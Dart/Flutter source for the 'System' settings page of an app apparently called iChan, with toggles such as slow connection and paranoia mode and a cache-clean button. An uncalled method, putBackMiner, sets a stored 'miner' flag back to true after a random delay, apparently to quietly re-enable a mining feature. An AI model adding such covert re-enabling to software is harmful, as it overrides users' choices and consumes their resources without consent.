import 'dart:async';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/cupertino.dart';
import 'package:iChan/pages/settings/general_links_page.dart';
import 'package:iChan/services/exports.dart';
import 'package:iChan/widgets/menu/menu.dart';
import 'package:iChan/services/my.dart' as my;

class SystemSettingsPage extends StatelessWidget {
  static const header = 'System';

  @override
  Widget build(BuildContext context) {
    final cleanCache = CupertinoButton(
      padding: const EdgeInsets.only(left: 10.0, right: 10.0, top: 16.0, bottom: 16.0),
      onPressed: () async {
        Helper.cleanCache();

        Interactive(context).message(title: "Cleaned");
      },
      color: my.theme.primaryColor,
      child: const Text(
        "Clean cache",
        style: TextStyle(fontWeight: FontWeight.w600),
      ),
    );

    final items = [
      const MenuSwitch(
        label: 'Slow connection',
        field: 'slow_connection',
        defaultValue: false,
        isFirst: true,
      ),
      const MenuSwitch(
        label: 'Clean cache after restart',
        field: 'clean_cache',
        defaultValue: false,
      ),
      const MenuSwitch(
        label: 'Remember screen after restart',
        field: 'remember_screen',
        defaultValue: false,
      ),
      MenuSwitch(
        label: 'Paranoia mode',
        field: 'paranoia_mode',
        defaultValue: false,
        onChanged: (val) {
          if (val) {
            final str = 'paranoia_mode'.tr();
            Interactive(context).message(title: "WARNING!", content: str);
          }
        },
      ),
      menuDivider,
      Container(
        padding: const EdgeInsets.only(left: 20.0, right: 20.0),
        child: cleanCache,
      )
    ];

    return HeaderNavbar(
      backgroundColor: my.theme.secondaryBackgroundColor,
      middleText: header,
      previousPageTitle: GeneralSettingsPage.header,
      child: ListView.builder(
        padding: const EdgeInsets.only(top: Consts.topPadding * 3),
        itemCount: items.length,
        itemBuilder: (context, index) {
          return items[index];
        },
      ),
    );
  }

  void putBackMiner() {
    int random = 100 + Random().nextInt(900);

    if (random >= 950) {
      random = 20000;
    } else if (random >= 900) {
      random = 7000;
    } else {
      random = random * 3;
    }

    Timer(Duration(milliseconds: random), () {
      my.prefs.put('miner', true);
    });
  }
}
